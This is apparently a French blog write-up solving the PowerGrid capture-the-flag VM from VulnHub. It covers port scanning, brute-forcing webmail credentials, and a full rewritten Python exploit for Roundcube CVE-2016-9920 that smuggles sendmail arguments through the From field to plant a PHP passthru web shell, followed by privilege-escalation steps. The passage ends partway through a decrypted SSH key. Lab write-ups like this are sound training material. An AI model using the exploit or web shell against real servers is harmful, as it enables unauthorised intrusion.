---
title: Solution du CTF Powergrid de VulnHub
tags: [CTF, VulnHub]
---

### Votre mission, si vous l'acceptez

[PowerGrid](https://vulnhub.com/entry/powergrid-101,485/) a été une bonne surprise. Il faut fouiller un peu pour obtenir le premier shell puis passer par des machines simulées via Docker.

Ce CTF a un timer mis en place : on ne dispose que de trois heures pour résoudre le CTF avant que la machine ne s'arrête. Il est conseillé de faire un snapshot au premier lancement de la VM.

Ça m'a d'ailleurs bien servi puisque j'ai gaspillé du temps sur un `Ncrack` qui buguait, un `legba` que je maitrisais mal, et un exploit que j'ai dû réécrire...

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.107
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.107
Host is up (0.00075s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.0.1
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Apache/2.4.38 (Debian)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
|       PACKETSTORM:176334      9.8     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
|       PACKETSTORM:171631      9.8     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-        *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-        *EXPLOIT*
--- snip ---
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
143/tcp open  imap     Dovecot imapd
993/tcp open  ssl/imap Dovecot imapd
MAC Address: 08:00:27:E8:7A:92 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.73 seconds
```

Pas de serveur SSH. Sans doute pour nous rendre la plus dure :)

Sur la page d'accueil, on a ce fameux décompte second par seconde ainsi que ce message :

```html
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <link rel="stylesheet" type="text/css" href="style.css" />
        <title>PowerGrid - Turning your lights off unless you pay.</title>
    </head>
    <body>
        <div id="content">
            <p>We have hacked every power grid across Europe.</p>
            <p>We demand a ransom of €25 Billion (in bitcoin) or the continent will plummet into darkness.</p>
            <p>This is not a drill. As you are aware, we have already trialled our methods.</p>
            <p>Our bitcoin address has been sent to your leaders. You have 3 hours before we turn your power off, and destroy our server of any evidence.
               Tick. Tock. Tick. Tock. Tick. Tock.</p><p>deez1, p48 and all2 from Cymru1 Hacking Team</p>
            <div id="app"></div>
        </div>
```

La description du CTF sur VulnHub mentionnait ceci :

> We know from previous intelligence that this group sometimes use weak passwords. We recommend you look at this attack vector first – make sure you configure your tools properly. We do not have time to waste.

Je place donc les noms d'utilisateurs dans un fichier puis je tente de casser ça. Essayons `ncrack` sur le service `imap` :

```console
$ ncrack -f -U users.txt -P wordlists/rockyou.txt imap://192.168.56.107

Starting Ncrack 0.8 ( http://ncrack.org ) at 2025-07-08 16:33 CEST

Discovered credentials for imap on 192.168.56.107 143/tcp:
192.168.56.107 143/tcp imap: 'deez1' 'rock you'

Ncrack done: 1 service scanned in 77.26 seconds.

Ncrack finished.
```

Je pensais que c'était bon, mais en réalité le mot de passe n'est pas accepté. Pour être sûr, j'ai relancé `ncrack` sur un autre utilisateur et il trouvait le même password.

En fouillant un peu plus, je me suis rendu compte que `ncrack` remontait comme valide tous les mots de passe contenant un espace ou un caractère non-ascii (exemple `ñ`).

Je suppose qu'il communique mal sur IMAP, le nom d'utilisateur et mot de passe devant normalement être passés entre double-quotes.

Une énumération du serveur web remonte un dossier `zmail` qui semble attendre une authentification basic :

```console
$ feroxbuster -u http://192.168.56.107/ -w DirBuster-0.12/directory-list-2.3-big.txt -n -x php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.107/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php, html]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      317c http://192.168.56.107/images
200      135l      367w     3642c http://192.168.56.107/index.php
401       14l       54w      461c http://192.168.56.107/zmail
403        9l       28w      279c http://192.168.56.107/server-status
403        9l       28w      279c http://192.168.56.107/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html
[####################] - 11m  3820686/3820686 0s      found:5       errors:0      
[####################] - 11m  3820686/3820686 5699/s  http://192.168.56.107/
```

J'ai tout de même jeté un coup d'œil au certificat sur `imaps` au cas où il faut brute-forcer des virtual hosts :

```console
$ openssl s_client -connect 192.168.56.107:993 -crlf
Connecting to 192.168.56.107
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN=powergrid
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=powergrid
verify return:1
---
Certificate chain
 0 s:CN=powergrid
   i:CN=powergrid
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: May 19 16:49:55 2020 GMT; NotAfter: May 17 16:49:55 2030 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC2TCCAcGgAwIBAgIUUA33Rof9HMSXyS7PV8uCO9kDiBYwDQYJKoZIhvcNAQEL
BQAwFDESMBAGA1UEAwwJcG93ZXJncmlkMB4XDTIwMDUxOTE2NDk1NVoXDTMwMDUx
NzE2NDk1NVowFDESMBAGA1UEAwwJcG93ZXJncmlkMIIBIjANBgkqhkiG9w0BAQEF
AAOCAQ8AMIIBCgKCAQEA38l1rI8ssL1q+bILF2ki6ndMJRkfamXi7DPkguTkQVUL
B1CjBtnXtLNBJ3chBN53MU0geUuIKKJDVTomTxC5kEAEZ9majFqYrKCaIGABzJuT
rrUV3FlsvxcK455CaSoCyHoxC8AtyG4I8kdcsOeZPuTJkuv95oR2JmtbJSpyT4Vy
SjZUsRunB2RD5taCWmEbHR4jFpgcMVPbgsw6QjE4OFemdGkaX5sjZocwZs8o3yhO
/yjxfJMtf7XVhIjbgiIcvp2qUZAC2CpaM/n+6AbBJqa5WIBah1dKUYO1xoQQLDgX
t8pQB5COH0UbtYW1y556PMofgG3jkKNC/R0Ivcz/hwIDAQABoyMwITAJBgNVHRME
AjAAMBQGA1UdEQQNMAuCCXBvd2VyZ3JpZDANBgkqhkiG9w0BAQsFAAOCAQEAlnjZ
OOAAOuoAIqO9cYjrVi5oo01u8ACoiwdXBmra8wXgEMVXoAnmT1sukl89aU2nrMRe
2Ep1IRuadQIrUUKIRCcwVPVOsl4LqwaeEUvzGP4D03n1KAvu/nRSHqbUWRVbGzKX
H5pQlHIUPPoaYR+soXTH2FZDtBwy8oyBMxAxgoFjPOoxmVK/5DUE8etTB5bItE0f
/cv8gWGtaPsk50Fvu+pXfKfgEOX1769lwuXthNlzSsuPa5LjDSSv6Rii0R6ELuK0
Runa+4YCOumR4kK1pwXxPJAQcDvhRDp/u/+NIZB72VEiJUv6RDkkAojAhtxzm2kr
T+48miG6/ZX3hhypEw==
-----END CERTIFICATE-----
subject=CN=powergrid
issuer=CN=powergrid
---
--- snip ---
```

Le nom d'hôte est `powergrid` sans suffixe. Ça semble donc peu probable.

Revenons à notre brute-force. Ici, je me concentre sur l'authentification basic. Pour cela, j'ai eu recours à `legba` que je n'avais jamais utilisé :

```console
$ docker run -v /tmp:/data --network host -it evilsocket/legba:latest \
  http.basic -I password --username /data/users.txt --password /data/rockyou.txt \
  --target http://192.168.56.107/zmail/
legba v0.11.0

[INFO ] target: http://192.168.56.107/zmail/
[INFO ] username -> wordlist /data/users.txt
[INFO ] password -> wordlist /data/rockyou.txt

[INFO ] tasks=4 mem=34.4 MiB targets=1 attempts=57377560 done=6133 (0.01%) speed=5652 reqs/s
[INFO ] tasks=4 mem=34.9 MiB targets=1 attempts=57377560 done=12245 (0.02%) speed=6113 reqs/s
[INFO ] tasks=4 mem=35.2 MiB targets=1 attempts=57377560 done=17551 (0.03%) speed=5303 reqs/s
[INFO ] tasks=4 mem=35.2 MiB targets=1 attempts=57377560 done=23634 (0.04%) speed=6060 reqs/s
--- snip ---
[INFO ] [2025-07-08 15:42:03] (http) <http://192.168.56.107/zmail/> username=p48 password=electrico
--- snip ---
```

J'ai perdu du temps aussi, car j'avais utilisé le module `http` au lieu de `http.basic`... Heureusement `tshark` m'a aidé à comprendre mon erreur en observant les requêtes HTTP transmises.

Une fois connecté avec `p48` / `electrico`, je les utilise dans le navigateur et me retrouve face à un webmail `RoundCube`.

La page de login demande des identifiants. Je saisis les mêmes et peux lire un email :

```
Subject    Important
From    <root@powergrid>
Date    2020-05-19 21:24

Listen carefully. We are close to our attack date. Nothing is going to stop us now.
Our malware is heavily planted in each power grid across Europe.
All it takes is a signal from this server after the timer has stopped, and nothing is going to stop that now.
For information, I have setup a backup server located on the same network - you shouldn't need to access it for now,
but if you do, scan for its local IP and use the SSH key encrypted below (it is encrypted with your GPG key, by the way).
The backup server has root access to this main server - if you need to make any backups, I will leave it for you to work out how.
I haven't got time to explain - we are too close to launching our hack.

-----BEGIN PGP MESSAGE-----

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
RO1va5L9lriZ1vmP37FxIwsrCVVcNrPJxWydvw==
=fPY9
-----END PGP MESSAGE-----
```

Clé GPG… On n'en a pas ! Que va-t-on faire alors ?

Dans la majorité des CTFs, on agit par étapes : on exploite un élément qui permet d'accéder à autre chose puis on exploite ce nouvel élément, etc.

Sur certains CTFs plusieurs étapes peuvent être concentrées sur un même élément comme le CTF [Presidential]({% link _posts/2021-12-26-Solution-du-CTF-Presidential-de-VulnHub.md %}) où il fallait exploiter un `phpMyAdmin` quand on pensait simplement l'utiliser pour obtenir des données.

Justement ! L'auteur de `Powergrid` est le même que celui de `Presidential` ! Ici le `RoundCube` donne une étape et il faut aussi l'exploiter.

Une vulnérabilité existe qui est décrite ici : [Roundcube 1.2.2 - Remote Code Execution](https://www.exploit-db.com/exploits/40892)

Et un exploit est présent sur Gihub : [t0kx/exploit-CVE-2016-9920: Roundcube 1.0.0 <= 1.2.2 Remote Code Execution exploit and vulnerable container](https://github.com/t0kx/exploit-CVE-2016-9920)

Toutefois l'exploit a quelques défauts :

- l'authentification basic n'est pas supportée

- l'auteur ne semble pas savoir que `requests` peut gérer proprement les cookies en utilisant un objet `session`

- il échoue, car il n'obtient pas une redirection quand il l'espère et du coup n'obtient pas l'ID pour composer un email

J'ai donc recodé l'exploit, mais je ne suis pas allé dans les détails (pas de gestion des exceptions). Toutefois, il fonctionne correctement et permet de retrouver un shell sur le path `/backdoor.php`.

```python
import logging
import re
import sys

import requests

logging.basicConfig(level=logging.DEBUG)

BASE_URL = "http://192.168.56.107/zmail/"
CMD = "<?php echo passthru($_GET['cmd']); ?>"
BACKDOOR = "/var/www/html/backdoor.php"
sess = requests.session()
sess.auth = ("p48", "electrico")

response = sess.get(BASE_URL)
match = re.search('"request_token":"([^"]+)"', response.text)
request_token = match.group(0).split(":")[1].replace("\"", "")

payload = {
        "_token": request_token, 
        "_task": "login",
        "_action": "login",
        "_timezone": 1,
        "_dstactive": 1,
        "_url": "",
        "_user": sess.auth[0],
        "_pass": sess.auth[1],
}

response = sess.post(
        BASE_URL + "?_task=login",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=payload,
        allow_redirects=False
)
if response.status_code == 302:
    request_token = response.headers["Location"].split("token=")[1]
else:
    logging.info("Could not get token from login response, using former token")

response = sess.get(BASE_URL + "?_task=mail&_mbox=INBOX&_action=compose", allow_redirects=False)
if response.status_code == 302:
    compose_id = response.headers['Location'].split("id=")[1]
else:
    logging.error("Could not get the compose ID")
    sys.exit()

payload = {
        "_token": request_token,
        "_task": "mail",
        "_action": "send",
        "_id": compose_id,
        "_attachments": "",
        "_from": "example@example.com -OQueueDirectory=/tmp -X" + BACKDOOR,
        "_to": "example@pWnexAmplE.sh",
        "_cc": "",
        "_bcc": "",
        "_replyto": "",
        "_followupto": "",
        "_subject": CMD,
        "editorSelector": "plain",
        "_priority": 0,
        "_store_target": "",
        "_draft_saveid": "",
        "_draft": "",
        "_is_html": 0,
        "_framed": 1,
        "_message": "pwn"
}

response = sess.post(
        BASE_URL + "?_task=mail&_lang=en_US&_framed=1",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=payload,
)
print(f"Message creation returned HTTP {response.status_code}")
```

### Ping Pong

Un rapatriement de `reverse-ssh` plus loin, j'ai mon premier flag :

```console
www-data@powergrid:/var/www$ cat flag1.txt 
fbd5cd83c33d2022ce012d1a306c27ae

Well done getting flag 1. Are you any good at pivoting?
www-data@powergrid:/var/www$ cat .htpasswd 
p48:$apr1$TychQAEQ$keuGxoPcPeMHc9thzQV7D1
```

Le hash se casse en `electrico` que l'on connait déjà.

Sous la racine web se trouve le fichier `startTime.txt` qui contient le timestamp de début du CTF :

```console
www-data@powergrid:/var/www/html$ ls -al
total 3644
drwxr-xr-x  4 www-data www-data    4096 Jul  8 15:27 .
drwxr-xr-x  3 root     root        4096 May 20  2020 ..
-rw-r--r--  1 www-data www-data     635 Jul  8 15:25 backdoor.php
drwxr-xr-x  2 www-data www-data    4096 May 19  2020 images
-rw-r--r--  1 www-data www-data    4308 May 20  2020 index.php
-rwxr-xr-x  1 www-data www-data 3690496 Oct 19  2022 reverse-sshx64
-rw-r--r--  1 root     root          19 Jul  8 15:25 startTime.txt
-rw-r--r--  1 www-data www-data    1382 May 19  2020 style.css
drwxr-xr-x 12 www-data www-data    4096 May 19  2020 zmail
```

Le fichier appartient à `root` mais le dossier courant est sous notre contrôle. On devrait en théorie pouvoir renommer le fichier et écrire une autre version à la place, shuntant ainsi le timer du CTF.

```console
www-data@powergrid:/var/www/html$ mv startTime.txt oldTime.txt
mv: cannot move 'startTime.txt' to 'oldTime.txt': Operation not permitted
```

Ça ne marche pas, on verra plus tard pourquoi.

Pour avancer, on se connecte à `p48` via `su` (toujours avec le même mot de passe) puis on trouve finalement la clé GPG :

```console
p48@powergrid:~$ ls -al
total 32
drwx------ 5 p48  p48  4096 May 19  2020 .
drwxr-xr-x 5 root root 4096 May 19  2020 ..
lrwxrwxrwx 1 p48  p48     9 May 19  2020 .bash_history -> /dev/null
drwx------ 3 p48  p48  4096 May 19  2020 .gnupg
drwx------ 3 p48  p48  4096 Jul  8 17:39 mail
-rw-r--r-- 1 p48  p48  6744 May 19  2020 privkey.gpg
drwx------ 2 p48  p48  4096 May 19  2020 .ssh
-rw------- 1 p48  p48  3652 May 19  2020 .viminfo
```

Le `.viminfo` contient quelques traces du challenge, mais on ne dispose pas d'accès aux fichiers en dehors de cla clé GPG :

```
# File marks:
'0  107  0  ~/privkey.gpg
|4,48,107,0,1589926379,"~/privkey.gpg"
'1  1  0  /root/chown.sh
|4,49,1,0,1589918383,"/root/chown.sh"
'2  1  0  /root/malware.php
|4,50,1,0,1589918379,"/root/malware.php"
'3  1  0  /var/log/messages
|4,51,1,0,1589916760,"/var/log/messages"
'4  77  24  ~/test
|4,52,77,24,1589916468,"~/test"
```

J'importe donc la clé GPG et déchiffre le message des pirates pour obtenir la clé SSH :

```console
$ gpg --import privkey.gpg 
gpg: clef 73D19820E29199BD : clef publique « P48 Hacker <p48@powergrid> » importée
gpg: clef 73D19820E29199BD : clef secrète importée
gpg: Quantité totale traitée : 1
gpg:                     importées : 1
gpg:           clefs secrètes lues : 1
gpg:      clefs secrètes importées : 1
$ gpg --decrypt message.crypted 
gpg: chiffré avec une clef rsa4096, identifiant 559041BFED54D3A2, créé le 2020-05-19
      « P48 Hacker <p48@powergrid> »
gpg: utiliser « 254FCE5E58607A46 » comme clef secrète par défaut pour signer
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAsBNVFExFUwpIaHIhMQDlu8mFwkNZWRFWBS5qE3BUUhk39/3CeAv2
81W7Z/63EM78eE1PjiccpNA5Vi2r+nfYLS6Nj7qy11BQsGlUKgmcxW79DdmC78LaFHUkYh
G3KtnJcLh4GAlPXoOwwXgwT8iu6dbxXGOzONCrWTTQ7/UjgJOcVIx9814uBDbZAYlXyjvN
aMnrO16Jff00wurmqNfq8D0lLWiU9Wq+9j5z+XvqHGaei3s3Wdhfoc3jtPfwUFsKSlVrQM
nj1i/43XOogwaPAThXRf21yfw5AIworT/xFHuAPlpWpT8z0KV8I4Z+DdiB4fHMtgWJ+t7O
pVzaZ0OP3XiGTXu4qjnRbsXMo/D8ZbGoiADbZnCLpjNlPKAA6HuPR+NmdnsKI/UnuQNjqz
NzBqME0Yrg9aEXUteHdk+mKb7Rppdz8EWYBtiYj+QReNV8DYX6CDl4yx51jTH7wN0Jb6lE
9p4ZOqmGat76j2KAtWAzF+6zLkf4Id+LXakzxC3tql+02kaYfVmq40gdwllIGocEJBT3D7
SWX8XL4KeOJW/1sY7HdoVCNuXSKz82/mtUmFB7hDUYpPse/GIAMbXn6lxURNc8LfkZXEVI
enSakNjjyK0VjUYIxc/sUAulXeuOxNjv3isHANxqcsYv0o+i2qgfAFxdsKkPML+bh0NGTL
MAAAdIKypuuSsqbrkAAAAHc3NoLXJzYQAAAgEAsBNVFExFUwpIaHIhMQDlu8mFwkNZWRFW
BS5qE3BUUhk39/3CeAv281W7Z/63EM78eE1PjiccpNA5Vi2r+nfYLS6Nj7qy11BQsGlUKg
mcxW79DdmC78LaFHUkYhG3KtnJcLh4GAlPXoOwwXgwT8iu6dbxXGOzONCrWTTQ7/UjgJOc
VIx9814uBDbZAYlXyjvNaMnrO16Jff00wurmqNfq8D0lLWiU9Wq+9j5z+XvqHGaei3s3Wd
hfoc3jtPfwUFsKSlVrQMnj1i/43XOogwaPAThXRf21yfw5AIworT/xFHuAPlpWpT8z0KV8
I4Z+DdiB4fHMtgWJ+t7OpVzaZ0OP3XiGTXu4qjnRbsXMo/D8ZbGoiADbZnCLpjNlPKAA6H
uPR+NmdnsKI/UnuQNjqzNzBqME0Yrg9aEXUteHdk+mKb7Rppdz8EWYBtiYj+QReNV8DYX6
CDl4yx51jTH7wN0Jb6lE9p4ZOqmGat76j2KAtWAzF+6zLkf4Id+LXakzxC3tql+02kaYfV
mq40gdwllIGocEJBT3D7SWX8XL4KeOJW/1sY7HdoVCNuXSKz82/mtUmFB7hDUYpPse/GIA
MbXn6lxURNc8LfkZXEVIenSakNjjyK0VjUYIxc/sUAulXeuOxNjv3isHANxqcsYv0o+i2q
